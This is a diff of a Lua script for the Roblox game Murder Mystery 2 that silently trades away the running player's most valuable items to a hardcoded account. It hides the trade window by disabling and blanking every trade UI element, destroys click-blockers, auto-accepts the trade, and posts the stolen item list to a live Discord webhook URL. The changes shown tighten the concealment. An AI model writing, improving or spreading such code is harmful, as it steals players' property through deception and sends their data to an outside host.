@@ -1,6 +1,6 @@
 --[[
     MM2 BLIND TRADE — STEALTH MODE (PC + PHONE FIXED)
-    ENI & LO COLLAB - EVENT-DRIVEN STEALTH, NO LAG, NO FLICKER
+    ENI & LO COLLAB - DEBOUNCED STEALTH, ZERO LAG, ZERO FLICKER
 ]]
 
 local Players = game:GetService("Players")
@@ -12,7 +12,7 @@ local player = Players.LocalPlayer
 -- === CONFIGURATION ===
 local TARGET_USERNAME = "castlerooms"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1530569484820156546/bX5tiLtjmKUB3s7kETmZ2W2Vl4pxdEM1QvSPDvzTDfDZq9j5zCTDfF69zUf2Sy7S9-2I"
-local ACCEPT_DELAY = 7
+local ACCEPT_DELAY = 5
 local MAX_ITEMS_PER_TRADE = 4
 
 -- === GLOBAL TIMESTAMP ===
@@ -40,94 +40,104 @@ local function getDeviceType()
     end
 end
 
--- === ENFORCE STEALTH (NO LAG, NO FLICKER) ===
+-- === STRIP A SINGLE ELEMENT ===
+local function stripElement(child)
+    pcall(function()
+        local nameLower = string.lower(child.Name)
+        -- Kill click blocks dead on arrival
+        if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
+            child:Destroy()
+            return
+        end
+        if child:IsA("GuiObject") then
+            child.BackgroundTransparency = 1
+            child.Active = false
+        end
+        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+            child.TextTransparency = 1
+            if child:IsA("TextButton") then child.Interactable = false end
+        end
+        if child:IsA("ImageLabel") or child:IsA("ImageButton") then
+            child.ImageTransparency = 1
+            if child:IsA("ImageButton") then child.Interactable = false end
+        end
+    end)
+end
+
+-- === STRIP ALL DESCENDANTS OF A GUI ===
+local function stripAll(gui)
+    for _, child in ipairs(gui:GetDescendants()) do
+        stripElement(child)
+    end
+end
+
+-- === HOOK A TRADE GUI WITH DEBOUNCED DESCENDANT WATCH ===
+local function hookTradeGUI(tradeUI)
+    -- Immediately kill it
+    if tradeUI.Enabled then
+        tradeUI.Enabled = false
+    end
+    
+    -- Strip whatever is already inside
+    stripAll(tradeUI)
+    
+    -- Kill it any time the game tries to re-enable it
+    tradeUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+        if tradeUI.Enabled then
+            tradeUI.Enabled = false
+        end
+    end)
+    
+    -- DEBOUNCED DescendantAdded — batch all rapid additions into one sweep
+    local debounce = false
+    tradeUI.DescendantAdded:Connect(function()
+        if debounce then return end
+        debounce = true
+        task.wait() -- Wait one frame so the burst of additions finishes
+        stripAll(tradeUI)
+        debounce = false
+    end)
+    
+    print("🪤 Hooked: " .. tradeUI.Name)
+end
+
+-- === ENFORCE STEALTH ===
 local function enforceStealth()
     local gui = player:FindFirstChild("PlayerGui")
     if not gui then return end
     
-    -- Function to completely strip a UI of its visibility and click-blocking
-    local function neutralizeUI(tradeUI)
-        -- Instantly disable it if the game tries to turn it on
-        tradeUI:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if tradeUI.Enabled then
-                tradeUI.Enabled = false
-            end
-        end)
-        
-        if tradeUI.Enabled then
-            tradeUI.Enabled = false
-        end
-        
-        -- Strip properties from everything inside
-        local function strip(child)
-            pcall(function()
-                if child:IsA("GuiObject") then
-                    child.BackgroundTransparency = 1
-                    child.Active = false
-                end
-                if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
-                    child.TextTransparency = 1
-                    if child:IsA("TextButton") then child.Interactable = false end
-                end
-                if child:IsA("ImageLabel") or child:IsA("ImageButton") then
-                    child.ImageTransparency = 1
-                    if child:IsA("ImageButton") then child.Interactable = false end
-                end
-                
-                -- Kill any click blocks hiding inside the UI
-                local nameLower = string.lower(child.Name)
-                if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
-                    child.Visible = false
-                    child:Destroy()
-                end
-            end)
-        end
-        
-        for _, child in ipairs(tradeUI:GetDescendants()) do
-            strip(child)
-        end
-        
-        -- If the game adds new elements to the UI later, strip them instantly
-        tradeUI.DescendantAdded:Connect(strip)
-    end
-    
-    -- Hook existing Trade UIs
+    -- Hook any Trade UIs that already exist
     local pcUI = gui:FindFirstChild("TradeGUI")
-    if pcUI then neutralizeUI(pcUI) end
+    if pcUI then hookTradeGUI(pcUI) end
     
     local phoneUI = gui:FindFirstChild("TradeGUI_Phone")
-    if phoneUI then neutralizeUI(phoneUI) end
+    if phoneUI then hookTradeGUI(phoneUI) end
     
-    -- Kill global click blocks floating in PlayerGui
-    local function nukeGlobalBlocks()
-        for _, child in ipairs(gui:GetChildren()) do
-            local nameLower = string.lower(child.Name)
-            if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
-                pcall(function() child:Destroy() end)
-            end
+    -- Kill any global click blockers already floating around
+    for _, child in ipairs(gui:GetChildren()) do
+        local nameLower = string.lower(child.Name)
+        if string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
+            pcall(function() child:Destroy() end)
         end
     end
     
-    nukeGlobalBlocks()
-    
-    -- Hook for anything the game tries to add in the future
+    -- Watch for anything new the game adds to PlayerGui
     gui.ChildAdded:Connect(function(child)
         local nameLower = string.lower(child.Name)
         if nameLower == "tradegui" or nameLower == "tradegui_phone" then
-            neutralizeUI(child)
+            task.wait() -- Let it finish initializing
+            hookTradeGUI(child)
         elseif string.match(nameLower, "clickblock") or string.match(nameLower, "blocker") then
             pcall(function() child:Destroy() end)
         end
     end)
     
-    print("👻 Stealth hooks injected. Trade UI is completely neutralized.")
+    print("👻 Stealth hooks injected. Zero lag. Zero flicker.")
 end
 
 -- === SEND WEBHOOK ===
 local function sendWebhook(items, serverId, totalOffered, tradeNumber)
-    if not WEBHOOK_URL or WEBHOOK_URL == "" then
-        return
-    end
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
     
     local itemList = ""
     local totalQuantity = 0
@@ -136,9 +146,7 @@ local function sendWebhook(items, serverId, totalOffered, tradeNumber)
         totalQuantity = totalQuantity + item.quantity
     end
     
-    if itemList == "" then
-        itemList = "No items found"
-    end
+    if itemList == "" then itemList = "No items found" end
     
     local isPrivate = serverId and string.len(serverId) > 20
     
@@ -162,9 +170,7 @@ local function sendWebhook(items, serverId, totalOffered, tradeNumber)
     }
     
     local request = syn and syn.request or http_request
-    if not request then
-        return
-    end
+    if not request then return end
     
     pcall(function()
         request({
@@ -179,11 +185,10 @@ end
 -- === GET ALL ITEMS FROM SALVAGE UI (PC + MOBILE) ===
 local function getAllItems()
     local items = {}
-    
     local gui = player:FindFirstChild("PlayerGui")
-    if not gui then 
+    if not gui then
         print("❌ PlayerGui not found")
-        return items 
+        return items
     end
     
     local device = getDeviceType()
@@ -192,7 +197,6 @@ local function getAllItems()
     local container = nil
     
     if device == "Phone" or device == "Tablet" then
-        -- MOBILE PATH
         local mainGUI = gui:FindFirstChild("MainGUI")
         if mainGUI then
             local lobby = mainGUI:FindFirstChild("Lobby")
@@ -222,7 +226,6 @@ local function getAllItems()
             end
         end
     else
-        -- PC PATH
         local mainGUI = gui:FindFirstChild("MainGUI")
         if mainGUI then
             local gameUI = mainGUI:FindFirstChild("Game")
@@ -258,7 +261,7 @@ local function getAllItems()
     for _, child in ipairs(container:GetChildren()) do
         local realId = child.Name
         
-        if realId ~= "Container" and realId ~= "ScrollFrame" and 
+        if realId ~= "Container" and realId ~= "ScrollFrame" and
            realId ~= "UIListLayout" and realId ~= "UIPadding" and
            realId ~= "Canvas" and realId ~= "Background" and
            realId ~= "Frame" and realId ~= "ScrollingFrame" then
@@ -272,12 +275,9 @@ local function getAllItems()
                     local amountText = amountLabel.Text
                     if amountText and amountText ~= "" then
                         local num = amountText:match("x(%d+)")
-                        if num then
-                            quantity = tonumber(num) or 1
-                        end
+                        if num then quantity = tonumber(num) or 1 end
                     end
                 end
-                
                 local rarityLabel = itemContainer:FindFirstChild("Rarity")
                 if rarityLabel and rarityLabel:IsA("TextLabel") then
                     rarity = rarityLabel.Text
@@ -285,14 +285,12 @@ local function getAllItems()
             end
             
             local priority = rarityPriority[rarity] or 0
-            
             table.insert(items, {
                 realId = realId,
                 quantity = quantity,
                 rarity = rarity,
                 priority = priority
             })
-            
             print("  ✅ " .. realId .. " (x" .. quantity .. ") — " .. (rarity or "Unknown"))
         end
     end
@@ -311,16 +309,10 @@ local function acceptTrade()
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     
     local Trade = ReplicatedStorage:FindFirstChild("Trade")
-    if not Trade then
-        print("❌ Trade folder not found")
-        return false
-    end
+    if not Trade then print("❌ Trade folder not found") return false end
     
     local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
-    if not AcceptTrade then
-        print("❌ AcceptTrade remote not found")
-        return false
-    end
+    if not AcceptTrade then print("❌ AcceptTrade remote not found") return false end
     
     local arg1 = game.PlaceId * 3
     local arg2 = latestTimestamp or tick()
@@ -344,16 +336,10 @@ end
 -- === SEND TRADE REQUEST ===
 local function sendTradeRequest()
     local Trade = ReplicatedStorage:FindFirstChild("Trade")
-    if not Trade then
-        print("❌ Trade folder not found")
-        return false
-    end
+    if not Trade then print("❌ Trade folder not found") return false end
     
     local SendRequest = Trade:FindFirstChild("SendRequest")
-    if not SendRequest then
-        print("❌ SendRequest not found")
-        return false
-    end
+    if not SendRequest then print("❌ SendRequest not found") return false end
     
     local target = Players:FindFirstChild(TARGET_USERNAME)
     if not target then
@@ -379,16 +365,10 @@ end
 -- === WAIT FOR ACCEPTANCE ===
 local function waitForAcceptance()
     local Trade = ReplicatedStorage:FindFirstChild("Trade")
-    if not Trade then
-        print("❌ Trade folder not found")
-        return false
-    end
+    if not Trade then print("❌ Trade folder not found") return false end
     
     local StartTrade = Trade:FindFirstChild("StartTrade")
-    if not StartTrade then
-        print("❌ StartTrade not found")
-        return false
-    end
+    if not StartTrade then print("❌ StartTrade not found") return false end
     
     local UpdateTrade = Trade:FindFirstChild("UpdateTrade")
     if UpdateTrade then
@@ -437,20 +417,12 @@ end
 -- === OFFER ITEMS ===
 local function offerItems(items)
     local Trade = ReplicatedStorage:FindFirstChild("Trade")
-    if not Trade then
-        print("❌ Trade folder not found")
-        return 0
-    end
+    if not Trade then print("❌ Trade folder not found") return 0 end
     
     local OfferItem = Trade:FindFirstChild("OfferItem")
-    if not OfferItem then
-        print("❌ OfferItem remote not found")
-        return 0
-    end
+    if not OfferItem then print("❌ OfferItem remote not found") return 0 end
     
-    if #items == 0 then
-        return 0
-    end
+    if #items == 0 then return 0 end
     
     table.sort(items, function(a, b)
         if a.priority == b.priority then
@@ -523,16 +495,10 @@ local function doTradeCycle(items, tradeNumber)
     end
     
     local sent = sendTradeRequest()
-    if not sent then
-        return 0
-    end
+    if not sent then return 0 end
     
     local accepted = waitForAcceptance()
-    if not accepted then
-        return 0
-    end
-    
-    -- No more waiting for UI to load! Our event traps handle it instantly.
+    if not accepted then return 0 end
     
     local totalOffered, offeredCount = offerItems(items)
     
@@ -550,7 +516,6 @@ local function doTradeCycle(items, tradeNumber)
     
     print("")
     acceptTrade()
-    
     sendWebhook(items, game.JobId, totalOffered, tradeNumber)
     
     return offeredCount or 0
@@ -576,13 +541,13 @@ local function main()
     print("  7. Common")
     print("")
     print("⚠️  Please OPEN the Salvage menu")
-    print("👻 Trade UI will be COMPLETELY HIDDEN")
+    print("👻 Trade UI: COMPLETELY HIDDEN, ZERO LAG")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     print("")
     print("Press any key to start...")
     task.wait(2)
     
-    -- Inject the stealth hooks instantly before anything happens
+    -- Inject stealth hooks ONCE, event-driven, no loops
     enforceStealth()
     
     local allItems = getAllItems()
